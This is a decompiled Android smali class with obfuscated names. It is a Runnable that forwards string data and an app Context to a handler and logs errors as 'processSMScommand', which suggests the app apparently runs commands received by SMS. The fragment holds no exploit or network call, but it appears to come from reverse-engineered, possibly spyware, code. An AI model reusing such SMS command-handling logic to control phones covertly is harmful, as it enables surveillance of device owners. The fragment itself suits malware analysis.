.class final Lcom/network/android/a/d;
.super Ljava/lang/Object;

# interfaces
.implements Ljava/lang/Runnable;


# instance fields
.field final synthetic a:Ljava/lang/String;

.field final synthetic b:Landroid/content/Context;

.field final synthetic c:Ljava/lang/String;


# direct methods
.method constructor <init>(Ljava/lang/String;Landroid/content/Context;Ljava/lang/String;)V
    .locals 0

    iput-object p1, p0, Lcom/network/android/a/d;->a:Ljava/lang/String;

    iput-object p2, p0, Lcom/network/android/a/d;->b:Landroid/content/Context;

    iput-object p3, p0, Lcom/network/android/a/d;->c:Ljava/lang/String;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public final run()V
    .locals 4

    :try_start_0
    invoke-static {}, Lcom/network/b/b;->m()V

    invoke-static {}, Lcom/network/b/b;->s()V

    iget-object v0, p0, Lcom/network/android/a/d;->a:Ljava/lang/String;

    invoke-virtual {v0}, Ljava/lang/String;->getBytes()[B

    move-result-object v0

    iget-object v1, p0, Lcom/network/android/a/d;->b:Landroid/content/Context;

    const/4 v2, 0x1

    iget-object v3, p0, Lcom/network/android/a/d;->c:Ljava/lang/String;

    invoke-static {v0, v1, v2, v3}, Lcom/network/android/a/b;->a([BLandroid/content/Context;ZLjava/lang/String;)Z

    iget-object v0, p0, Lcom/network/android/a/d;->b:Landroid/content/Context;

    invoke-static {v0}, Lcom/network/android/a/b;->a(Landroid/content/Context;)V
    :try_end_0
    .catch Ljava/lang/Throwable; {:try_start_0 .. :try_end_0} :catch_0

    :goto_0
    return-void

    :catch_0
    move-exception v0

    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "processSMScommand: "

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v1, v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;Ljava/lang/Throwable;)V

    goto :goto_0
.end method
